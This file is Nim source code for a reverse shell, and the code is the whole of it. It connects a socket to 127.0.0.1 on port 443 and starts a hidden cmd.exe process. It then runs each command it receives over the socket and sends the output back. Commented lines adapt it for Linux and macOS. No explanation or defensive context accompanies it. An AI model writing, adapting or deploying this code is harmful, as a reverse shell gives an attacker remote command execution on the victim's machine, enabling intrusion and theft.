import net, streams, osproc

let c: Socket = newSocket()
c.connect("127.0.0.1", Port(443))

var p = startProcess("cmd.exe", options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
var input = p.inputStream()
var output = p.outputStream()

while true:
  let cmds: string = c.recvLine()
  #Linux/MacOS
  #input.writeLine(cmds & ";echo 'DONEDONE'")
  #Windows
  input.writeLine(cmds & " & echo DONEDONE")
  input.flush()
  var o: string
  while output.readLine(o):
    if o == "DONEDONE":
      break
    c.send(o & "\r\L")
